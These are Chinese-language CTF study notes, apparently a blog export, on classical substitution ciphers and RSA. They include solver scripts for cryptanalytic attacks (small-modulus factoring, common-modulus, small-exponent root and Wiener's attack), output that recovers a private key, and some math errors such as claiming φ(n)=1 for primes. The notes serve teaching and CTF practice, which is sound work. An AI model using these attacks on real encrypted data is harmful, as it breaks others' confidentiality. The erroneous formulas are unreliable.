<h3 id="替代密码">替代密码</h3>
<p>会变更密文。</p>
<h4 id="单表替换">单表替换</h4>
<p>以下为特例，一般是以乱序表来替换，经典的单表替代密码就是用一个替代表对每一个位置的字符进行查表替换，词频分析可解。</p>
<h5 id="凯撒密码">凯撒密码</h5>
<p>通过把字母在字母表上移动一定位数来实现加密解密，秘钥空间小，可直接爆破。</p>
<h6 id="例题-1">例题</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        r += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + k) % <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> m, k</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> caesar_encrypt(m, k).encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:bXNobgJyaHB6aHRwdGgE</span></span><br></pre></td></tr></table></figure>
<p>解法为爆破。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        r += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + k) % <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="string">&quot;bXNobgJyaHB6aHRwdGgE&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">129</span>):</span><br><span class="line">    <span class="built_in">print</span>  caesar_encrypt(m.decode(<span class="string">&quot;base64&quot;</span>), i)</span><br></pre></td></tr></table></figure>
<h5 id="埃特巴什码">埃特巴什码</h5>
<p>通过将字母表的位置完全镜面对称后获得字母的替代表进行加密，攻击方法为将其替代回去。</p>
<h5 id="培根密码">培根密码</h5>
<p>AB表达两种字体，五个一组。类似二进制。</p>
<h5 id="猪圈密码">猪圈密码</h5>
<p>图形替代密码，不做赘述。</p>
<h5 id="仿射密码">仿射密码</h5>
<p>依据公式<strong>c=am+b mod n</strong>来生成仿射密码的替代表。</p>
<ul>
<li><strong>m</strong>为明文对应字母得到的数字。</li>
<li><strong>n</strong>为字符数量。</li>
<li><strong>c</strong>为密文。</li>
<li><strong>a</strong>、<strong>b</strong>为秘钥。</li>
</ul>
<p>解密方法为求<strong>a</strong>关于<strong>n</strong>的逆元，公式<strong>m
= modinv(a)(c-b) mod
n</strong>，攻击方法有爆破、词频统计和已知明文攻击【如果知道一对<strong>(m,c)</strong>，那么知道<strong>a</strong>和<strong>b</strong>是简单的。</p>
<h4 id="多表替换">多表替换</h4>
<h5 id="维吉尼亚密码">维吉尼亚密码</h5>
<p>秘钥不是固定不变的，随位置产生而改变，若密文为LOVE，则四个为一组进行循环加密。</p>
<h4 id="词频统计"><a
href="**http://quipqiup.com/index.php**">词频统计</a></h4>
<p>依赖在英语语言中字母的使用频率进行分析。</p>
<p>单表替换：统计所有字母频率，替换频率最近的。</p>
<p>多表替换：抽取使用相同替换表的所有密文，然后使用单表替换。</p>
<h5 id="twctf2016-vigenere">TWCTF2016 vigenere</h5>
<p>先进行<strong>base64</strong>编码后维吉尼亚加密。</p>
<h6 id="卡西斯基实验">卡西斯基实验</h6>
<p>若连续三个相同字母如ABC在密文中重复出现会是什么原因。</p>
<p>不同明文，不同秘钥：碰巧</p>
<p>相同明文，相同秘钥：如the经常连续出现，出现的间距的秘钥长度的倍数</p>
<p>解密方式为寻找重复出现的密文，求间距最大公约数。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学 从入门到放弃 公钥密码</title>
    <url>/Study-Cipher-Public-Key/</url>
    <content><![CDATA[<p>再续前缘，整理一下<strong>bibi</strong>师傅的笔记。</p>
<p>公钥密码部分。</p>
<p>公钥密码【<strong>Public-key
cryptography</strong>，也称非对称密码学，是密码学的一种算法，它需要两个密钥，一个是公开密钥，另一个是私有密钥；一个用作加密，另一个则用作解密。使用其中一个密钥把明文加密后所得的密文，只能用相对应的另一个密钥才能解密得到原本的明文；甚至连最初用来加密的密钥也不能用作解密。由于加密和解密需要两个不同的密钥，故被称为非对称加密；不同于加密和解密都使用同一个密钥的对称加密。虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个来源请求；因此其中一个可以公开，称为公钥，任意向外发布；不公开的密钥为私钥，必须由用户自行严格秘密保管，绝不透过任何途径向任何人提供，也不会透露给被信任的要通信的另一方。</p>
<span id="more"></span>
<h1 id="数论前置">数论前置</h1>
<h2 id="欧拉函数">欧拉函数</h2>
<p><span class="math inline">\(\varphi(n)\)</span>表示为小于等于<span
class="math inline">\(n\)</span>的正整数中和<span
class="math inline">\(n\)</span>互质的数，对于质数来说，<span
class="math inline">\(\varphi(n)=1\)</span>。</p>
<h2 id="欧几里得算法">欧几里得算法</h2>
<p>求最大公约数的算法，又称辗转相除法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd2</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
<h2 id="裴蜀定理">裴蜀定理</h2>
<p>𝑎𝑥+𝑏𝑦=𝑔𝑐𝑑(𝑎,𝑏)</p>
<p>对于任意的整数𝑎,b，都存在一对整数𝑥,y，使得<span
class="math inline">\(ax+by=gcd(a,b)\)</span>成立。</p>
<p>那么对于一个经典方程ax+by=1，有gcd(a,b)=1，即a,b一定互质。</p>
<h2 id="扩展欧几里得算法">扩展欧几里得算法</h2>
<p>快速欧拉演算</p>
<ul>
<li>求解不定方程</li>
<li>求解模的逆元</li>
<li>求解线性同余方程</li>
</ul>
<p>从裴蜀定理的ax+by=m得出，若存在合法的x,y使得该不定方程有解，则其m必为gcd(a,b)的倍数。</p>
<p>a-&gt;e,b-&gt;(n)</p>
<p>而扩展欧几里得算法可以求出x,y的值。</p>
<h3 id="乘法逆元">乘法逆元</h3>
<p>对于任意整数<span class="math inline">\(a\)</span>和正整数<span
class="math inline">\(m\)</span>，取模运算就是求出<span
class="math inline">\(a\)</span>除以<span
class="math inline">\(m\)</span>的余数，通常表示为<span
class="math inline">\(a\,mod\,m\)</span>。</p>
<p>对于给定的整数<span class="math inline">\(a\)</span>和模数<span
class="math inline">\(m\)</span>，如果存在一个整数<span
class="math inline">\(x\)</span>，使得<span
class="math inline">\(ax\,mod\,m\)</span>等于<span
class="math inline">\(1\)</span>，那么<span
class="math inline">\(x\)</span>就是<span
class="math inline">\(a\)</span>在模<span
class="math inline">\(m\)</span>下的乘法逆元。</p>
<p>注意，乘法逆元存在的前提是<span
class="math inline">\(a\)</span>和<span
class="math inline">\(m\)</span>互素（即<span
class="math inline">\(a\)</span>和<span
class="math inline">\(m\)</span>没有除<span
class="math inline">\(1\)</span>以外的公因子）。</p>
<h3 id="例题">例题</h3>
<p>求47x+30y=1的整数解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">47=30*1+17 // y=1, x=1</span><br><span class="line">30=17*1+13 //    </span><br><span class="line">17=13*1+4 // 同上</span><br><span class="line">13=4*3+1 // 同上</span><br></pre></td></tr></table></figure>
<p>然后改写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17=47*1+30*(-1)</span><br><span class="line">13=30*1+17*(-1)</span><br><span class="line">4=17*1+13*(-1)</span><br><span class="line">1=13+4*(-3)</span><br></pre></td></tr></table></figure>
<p>倒回去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=13+4*(-3)</span><br><span class="line">1=13+[17*1+13*(-1)]*(-3)</span><br><span class="line">1=17*(-3)+13*4</span><br><span class="line">1= 17*(-3)+[30*1+17*(-1)]*4</span><br><span class="line">1=30*4+17*(-7)</span><br><span class="line">1=30*4+[47*1+30*(-1)]*(-7)</span><br><span class="line">1=47*(-7)+30*11</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def ext_euclid(a, b):</span><br><span class="line">     if b == 0:</span><br><span class="line">         return 1, 0, a</span><br><span class="line">     else:</span><br><span class="line">         x, y, q = ext_euclid(b, a % b) # q = gcd(a, b) = gcd(b, a%b)</span><br><span class="line">         x, y = y, (x - (a // b) * y)</span><br><span class="line">         return x, y, q</span><br></pre></td></tr></table></figure>
<h3 id="欧拉定理">欧拉定理</h3>
<h2 id="中国剩余定理">中国剩余定理</h2>
<p>《孙子算经》中有问：今有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二，问物几何？在现代数论中我们把它写成解一元线性同余方程组。
<span class="math display">\[
x\equiv2(mod\,3)
\\
x\equiv3(mod\,5)
\\
x\equiv2(mod\,7)
\]</span></p>
<h3 id="算法流程">算法流程</h3>
<ol type="1">
<li>计算模数之积：<span class="math inline">\(N=n_1n_2n_3\cdot\cdot\cdot
n_n\)</span></li>
<li>对于第i个方程：
<ol type="1">
<li>计算<span class="math inline">\(m_i=\frac{n}{n_i}\)</span></li>
<li>计算<span class="math inline">\(m_i\)</span>对于<span
class="math inline">\(n_i\)</span>的逆元<span
class="math inline">\(m^{-1}_i\)</span></li>
<li>计算<span class="math inline">\(c_i=m_im^{-1}_i\)</span></li>
</ol></li>
<li>方程得解：<span
class="math inline">\(x=\sum^{i=1}_{k}a_ic_i(mod\,n)\)</span></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">k, a, r</span>):</span><br><span class="line">    n = <span class="number">1</span>; ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, k + <span class="number">1</span>):</span><br><span class="line">        n = n * r[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, k + <span class="number">1</span>):</span><br><span class="line">        m = n // r[i]; b = y = <span class="number">0</span></span><br><span class="line">        exgcd(m, r[i], b, y) <span class="comment"># b * m mod r[i] = 1</span></span><br><span class="line">        ans = (ans + a[i] * m * b % n) % n</span><br><span class="line">    <span class="keyword">return</span> (ans % n + n) % n</span><br></pre></td></tr></table></figure>
<h3 id="举例求解">举例求解</h3>
<ul>
<li><span class="math inline">\(n=3*5*7=105\)</span></li>
<li><span
class="math inline">\(m_1=\frac{n}{n_1}=35,m^{-1}_i=2,c_1=35*2=70\)</span></li>
<li>依次得出<span
class="math inline">\(m_2=21,m^{-1}_2=1,c_2=21,m_3=15,m^{-1}_3=1,c_3=15\)</span></li>
<li>故解为<span
class="math inline">\(x=a_1c_1+a_2c_2+a_3c_3\,(mod\,n)=233(mod\,105)=23\)</span></li>
</ul>
<h1 id="rsa">RSA</h1>
<h2 id="原理">原理</h2>
<ol type="1">
<li><p>选两个大素数 <span class="math inline">\(p\)</span> 、 <span
class="math inline">\(q\)</span> ,计算出模数 <span
class="math inline">\(N = p * q\)</span> 。</p></li>
<li><p>再计算欧拉函数，<span class="math inline">\(φ(N) = φ(p)φ(q) =
(p−1)(q−1)\)</span>。</p></li>
<li><p>选择一个小于 <span class="math inline">\(φ(N)\)</span> 但大于 1
的整数 <span class="math inline">\(e\)</span>，使 <span
class="math inline">\(e\)</span> 和 <span
class="math inline">\(φ(N)\)</span> 互质。</p></li>
<li><p>求得 <span class="math inline">\(e\)</span> 关于 <span
class="math inline">\(φ(N)\)</span> 的模反元素，命名为 <span
class="math inline">\(d\)</span> ，有 <span
class="math inline">\(ed\,mod\,\varphi(n)=1\,mod\,\varphi(n)\)</span>。</p></li>
</ol>
<blockquote>
<p>欧拉定理：e与n互质时，n的欧拉函数<span
class="math inline">\(\varphi(n)\)</span>使得<span
class="math inline">\(e^{φ(n)}=1\,mod\,n\)</span>，而n为质数，所以n的欧拉函数<span
class="math inline">\(\varphi(n)=n-1\)</span>，此时欧拉定理可写为<span
class="math inline">\(e^{n-1}=1\,mod\,n\)</span>，被称为费马小定理。</p>
</blockquote>
<ol start="5" type="1">
<li>此时，<span class="math inline">\((N,e)\)</span>
是公钥，发送给对方用来加密消息，<span
class="math inline">\((N,d)\)</span> 是私钥，自己留着用来解密消息。</li>
<li>消息加密：<span class="math inline">\(m^e\,mod\,N=c\)</span></li>
<li>消息解密：<span class="math inline">\(c^d\,mod\,N=m\)</span></li>
<li>在这个过程中，第三方窃听者只能获取到 <span
class="math inline">\(c,e,n\)</span>，无法解出明文 <span
class="math inline">\(m\)</span>。</li>
<li>其中，明文 <span class="math inline">\(m\)</span> 长度需小于模数
<span class="math inline">\(n\)</span>。</li>
</ol>
<h3 id="加密过程">加密过程</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_v1_5</span><br><span class="line"></span><br><span class="line">msg = &#x27;crypto here&#x27;</span><br><span class="line">p = getPrime(128)</span><br><span class="line">q = getPrime(128)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(64)</span><br><span class="line">pubkey = RSA.construct((long(n), long(e)))</span><br><span class="line">privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))</span><br><span class="line">key = PKCS1_v1_5.new(pubkey)</span><br><span class="line">enc = key.encrypt(msg).encode(&#x27;base64&#x27;)</span><br><span class="line">key = PKCS1_v1_5.new(privatekey)</span><br><span class="line">msg = key.decrypt(enc.decode(&#x27;base64&#x27;), e)</span><br></pre></td></tr></table></figure>
<h3 id="一些工具">一些工具</h3>
<h4 id="rsatool"><a
href="https://github.com/ius/rsatool">RSAtool</a></h4>
<h4 id="openssl">openssl</h4>
<ul>
<li><p>查看公钥文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure></li>
<li><p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsautl -decrypt -inkey private.pem -in flag.enc -out flag</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="分解整数工具">分解整数工具</h4>
<ul>
<li><a href="http://factordb.com/">factor.db</a></li>
<li><a
href="https://github.com/ryosan-470/factordb-pycli">factordb-pycli</a></li>
<li><a href="https://sourceforge.net/projects/yafu/">yafu</a></li>
</ul>
<h4 id="rsa-wiener-attack"><a
href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a></h4>
<h4 id="ctf-rsa-tool"><a
href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_theory/">CTF-RSA-tool</a></h4>
<h3 id="直接模数分解">直接模数分解</h3>
<p>直接模数分解首当其冲的一个便是数学难题：分解大素数<strong>N</strong>。</p>
<h4 id="暴力分解">暴力分解</h4>
<p>当<strong>N</strong>的长度较小可直接分解【长度小于<strong>512bit</strong>。</p>
<p>例题</p>
<p><strong>Jarvis OJ</strong>的一题<strong>Medium
RSA</strong>，给了一个公钥和一个密文。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -in pubkey.pem -pubin -noout -text -modulus</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br></pre></td></tr></table></figure>
<p><strong>N</strong>很小，可以直接分解，使用<strong><a
href="https://github.com/3summer/CTF-RSA-tool">CTF-RSA-Tool</a></strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python solve.py --verbose --private -N 87924348264132406875276140514499937145050893665602592992418171647042491658461 -e 65537</span><br><span class="line">DEBUG: factor N: try past ctf primes</span><br><span class="line">DEBUG: factor N: try Gimmicky Primes method</span><br><span class="line">DEBUG: factor N: try Wiener&#x27;s attack</span><br><span class="line">DEBUG: Starting new HTTP connection (1): www.factordb.com:80</span><br><span class="line">DEBUG: http://www.factordb.com:80 &quot;GET /index.php?query=87924348264132406875276140514499937145050893665602592992418171647042491658461 HTTP/1.1&quot; 200 1021</span><br><span class="line">DEBUG: http://www.factordb.com:80 &quot;GET /index.php?id=1100000000836631227 HTTP/1.1&quot; 200 899</span><br><span class="line">DEBUG: http://www.factordb.com:80 &quot;GET /index.php?id=1100000000836631226 HTTP/1.1&quot; 200 898</span><br><span class="line">DEBUG: d = 0x1806799bd44ce649122b78b43060c786f8b77fb1593e0842da063ba0d8728bf1L</span><br><span class="line">INFO:</span><br><span class="line">p=275127860351348928173285174381581152299</span><br><span class="line">q=319576316814478949870590164193048041239</span><br><span class="line">d=10866948760844599168252082612378495977388271279679231539839049698621994994673</span><br><span class="line"></span><br><span class="line">INFO: private key:</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIGqAgEAAiEAwmNq5cPY5D/7l6sJAo8arGwL9s09cOvKKBv/6X++MN0CAwEAAQIg</span><br><span class="line">GAZ5m9RM5kkSK3i0MGDHhvi3f7FZPghC2gY7oNhyi/ECEQDO+7LPfhipjr7cNuPn</span><br><span class="line">w7ArAhEA8Gwo6RyJIrnCNuI1YMCXFwIRAJulRkclqWIHx5pNZIAp9VUCEGjeJLIZ</span><br><span class="line">ek+lSut5m+LJ3p0CEDRBEd7C622/wt1+58xOIfE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>然后解出<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">n = 87924348264132406875276140514499937145050893665602592992418171647042491658461</span><br><span class="line">d = 10866948760844599168252082612378495977388271279679231539839049698621994994673</span><br><span class="line">c = open(&#x27;flag.enc&#x27;).read().encode(&#x27;hex&#x27;)</span><br><span class="line">c = int(c, 16)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print long_to_bytes(m)</span><br><span class="line"># ���&amp;[�PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure>
<h4 id="pq选择不当">PQ选择不当</h4>
<p><strong>N</strong>中<strong>P</strong>和<strong>Q</strong>选择存在的问题【过于接近/差距过大/光滑。</p>
<ul>
<li><strong>|p-q|</strong>很大：当<strong>p-q</strong>很大时，一定存在某一个参数较小，这里我们假设为<strong>p</strong>，那么我们可以通过穷举的方法对模数进行试除，从而分解模数，得到保密参数与明文信息。基本来说，不怎么可行。</li>
<li>费马分解和<strong>Pollard_rho</strong>分解</li>
<li><strong>p-1光滑</strong></li>
<li><strong>p+1</strong>光滑【<strong>2017 SECCON very
smooth</strong></li>
<li>一些特定的<strong>N</strong>【在<strong>factordb</strong>上测试一下</li>
</ul>
<h4 id="yafu分解"><strong>Yafu</strong>分解</h4>
<h5 id="例题-1">例题</h5>
<p>[xman2019]xyf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d=modinv(e,(p-1)*(q-1))%((p-1)*(q-1)) </span><br><span class="line">m=pow(c,d,n) </span><br><span class="line">print long_to_bytes(m)</span><br></pre></td></tr></table></figure>
<h3 id="公约数模数分解">公约数模数分解</h3>
<p>如果在两个模数中使用了1个相同的素因子，那么可以使用求最大公约数的方法求出来</p>
<p>一般会给两个很难通过其他方法解出的模数</p>
<p>c1,e1,n1</p>
<p>c2,e2,n2</p>
<p>gcd(n1,n2)如果不是1的话，那么就可以分解n1和n2</p>
<h3 id="共模攻击">共模攻击</h3>
<p>​ 两组及以上的RSA加密过程，而且其中两次的<span
class="math inline">\(m\)</span>和<span
class="math inline">\(n\)</span>都是相同的，但是<span
class="math inline">\(e\)</span>不同，那么就可以使用共模攻击。 <span
class="math display">\[
c_1=m^{e_1}\,mod\,N
\\
c_2=m^{e_2}\,mod\,N
\]</span></p>
<p>​ 使用扩展的欧几里得算法求出<span
class="math inline">\(r\)</span>和<span class="math inline">\(s\)</span>
<span class="math display">\[
re_1+se_2=1\,mod\,N
\\
c^r_1c^s_2=(m^{re_1})*(m^{se_2})mod\,N=m\,mod\,N
\]</span></p>
<h4 id="例题-2">例题</h4>
<p>[xman2019]xgm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">e1 = 773</span><br><span class="line">e2 = 839</span><br><span class="line">n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span><br><span class="line">c1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line">c2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br><span class="line"></span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line">m = pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line">print(m)</span><br><span class="line">i = 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">plain = str(m)</span><br><span class="line">while i &lt; len(plain):</span><br><span class="line">    if plain[i] == &#x27;1&#x27;:</span><br><span class="line">        flag += chr(int(plain[i:i + 3]))</span><br><span class="line">        i += 3</span><br><span class="line">    else:</span><br><span class="line">        flag += chr(int(plain[i:i + 2]))</span><br><span class="line">        i += 2</span><br><span class="line">print(flag)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="小指数明文爆破">小指数明文爆破</h3>
<p><span class="math display">\[
c = m^e\,mod\,N
\]</span></p>
<p>如果<span class="math inline">\(e\)</span>很小，比如<span
class="math inline">\(e=3\)</span>，那么如果明文也很小的情况下可能会出现这种情况：<span
class="math inline">\(m^e&lt;n\)</span></p>
<p>此时直接对<span class="math inline">\(c\)</span>开<span
class="math inline">\(e\)</span>次根号就可以得到<span
class="math inline">\(m\)</span>。</p>
<p>还有一种一般一点的情况：</p>
<p><span class="math inline">\(kn&lt;m^3&lt;(k+1)n\)</span></p>
<p>就是说<span class="math inline">\(m^e\)</span>虽然大于<span
class="math inline">\(n\)</span>了但是没有超出太多</p>
<p>爆破<span class="math inline">\(k\)</span></p>
<h4 id="例题-3">例题</h4>
<p>JarvisOJ，crypto，[xman2019]xbk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e = 3</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n= 22885480907469109159947272333565375109310485067211461543881386718201442106967914852474989176175269612229966461160065872310916096148216253429849921988412342732706875998100337754561586600637594798877898552625378551427864501926224989873772743227733285336042475675299391051376624685754547818835551263597996620383338263448888107691240136257201191331617560711786674975909597833383395574686942099700631002290836152972352041024137872983284691831292216787307841877839674258086005814225532597955826353796634417780156185485054141684249037538570742860026295194559710972266059844824388916869414355952432189722465103299013237588737</span><br><span class="line">c= 15685364647213619014219110070569189770745535885901269792039052046431067708991036961644224230125219358149236447900927116989931929305133870392430610563331490276096858863490412102016758082433435355613099047001069687409209484751075897343335693872741</span><br><span class="line"></span><br><span class="line">print &#x27;n=&#x27;, n</span><br><span class="line">print &#x27;c=&#x27;, c</span><br><span class="line"></span><br><span class="line">print &#x27;[+]Detecting m...&#x27;</span><br><span class="line">result = gmpy2.iroot(c, 3)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">n = 114976915747243387792157708464120735018971336213935438953074748276198282761939060395482051056351068439137722626185590043024556656813730840050547350912425438364703854627760482842307943026011880815011654341047422453012558617703411700393668892701036222135444420377515575624398723436532681305293727164639582093389</span><br><span class="line">c = 5828813410620741112500628876643872258919868379601617907887884191584237969605489971465692568848339200057188383649365078832766143513766368216471491824042974016773526107276856706832404477882581400769791378958901067683158857990261489285951805740071223765359992165262854641069674603160977034446644199945940251030</span><br><span class="line">e = 3</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while 1:</span><br><span class="line">    if (gmpy2.iroot(c + i * n, 3)[1] == 1):</span><br><span class="line">        print(long_to_bytes(gmpy2.iroot(c + i * n, 3)[0]))</span><br><span class="line">        break</span><br><span class="line">    i = i + 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 3</span><br><span class="line">n = 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span><br><span class="line">c = 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span><br></pre></td></tr></table></figure>
<h3 id="选择密文攻击">选择密文攻击</h3>
<h4 id="rsa-parity-oracle">RSA parity oracle</h4>
<p>假设目前存在一个
Oracle，它会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如
1 表示奇数，0 表示偶数。那么给定一个加密后的密文，我们只需要 log(N)
次就可以知道这个密文对应的明文消息。</p>
<h5 id="原理-1">原理</h5>
<h6 id="step-1">Step 1</h6>
<p><span class="math display">\[
C=P^emod\,N
\]</span></p>
<p>如果我们给服务器发送<span
class="math inline">\(2^eC\)</span>，那么由于<span
class="math inline">\(2^eC=(2P)^e\,mod\,N\)</span>，服务器会计算<span
class="math inline">\((2^eC)^d\,mod\,N=2^{ed}C^d\,mod\,N\)</span>得到<span
class="math inline">\(2P\,mod\,N\)</span>。</p>
<p>此处2P是偶数，其幂次也是偶数，而N是奇数，因为是两个素数相乘得到。</p>
<p>如果服务器返回奇数，则说明2P&gt;N，因为偶数减去奇数为奇数。由2P&gt;N，又因为P&lt;N，得<span
class="math inline">\(\frac{N}{2}&lt;P&lt;N\)</span>。</p>
<p>如果服务器返回偶数，则说明2P&lt;N，得<span
class="math inline">\(0&lt;P&lt;\frac{N}{2}\)</span>。</p>
<h6 id="step-2">Step 2</h6>
<p>假设第一步返回奇数，<span
class="math inline">\(\frac{N}{2}&lt;P&lt;N\)</span>。</p>
<p>那么继续给服务器发送<span
class="math inline">\(2^{2e}C\)</span>，即<span
class="math inline">\(4^eC\)</span></p>
<p>https://dawn-whisper.hack.best/2020/10/10/RSA_Parity_Oracle/</p>
<h3 id="wieners-attack">Wiener’s Attack</h3>
<p>在<span
class="math inline">\(e\)</span>过大或过小的情况下，可使用算法利用<span
class="math inline">\(e\)</span>快速推断出<span
class="math inline">\(d\)</span>的值。</p>
<p>与低加密指数相同，低解密指数可以加快解密的过程，但是也带来了安全问题。</p>
<p>如果满足<span
class="math inline">\(d&lt;\frac{1}{3}n^{\frac{1}{4}}\)</span>，那么一种基于连分数【一个数论当中的问题】的特殊攻击类型就可以危害
RSA 的安全。</p>
<p>此时需要满足：<span
class="math inline">\(q&lt;p&lt;2q\)</span>，则可以在多项式时间中分解
<span class="math inline">\(n\)</span>，思路如下。 <span
class="math display">\[
n=pq
\\
\varphi(n)=(p-1)(q-1)=pq-(p+q)+1=n-(p+q)+1
\]</span> 由于<span class="math inline">\(n\)</span>很大，因此<span
class="math inline">\(\varphi(n)\approx n\)</span>，而<span
class="math inline">\(ed\equiv1\,mod\,\varphi(n)\)</span>得<span
class="math inline">\(ed-1=k\varphi(n)\)</span>，两边同除<span
class="math inline">\(d\varphi(n)\)</span>得<span
class="math inline">\(\frac{e}{\varphi(n)}-\frac{k}{d}=\frac{1}{d\varphi(n)}\)</span>。</p>
<p><span class="math inline">\(\varphi(n)\)</span>很大，且近似<span
class="math inline">\(n\)</span>，故等式右边近似0，得出<span
class="math inline">\(\frac{e}{n}\)</span>略大于<span
class="math inline">\(\frac{k}{d}\)</span>。</p>
<p>而在RSA中，对于窃听者而言，<span
class="math inline">\(e\)</span>和<span
class="math inline">\(n\)</span>是公开的，那么对于<span
class="math inline">\(\frac{k}{d}\)</span>，计算出<span
class="math inline">\(\frac{e}{n}\)</span>的每个渐进分数，便可精确覆盖<span
class="math inline">\(\frac{k}{d}\)</span>。【论文的结论，不多赘述】</p>
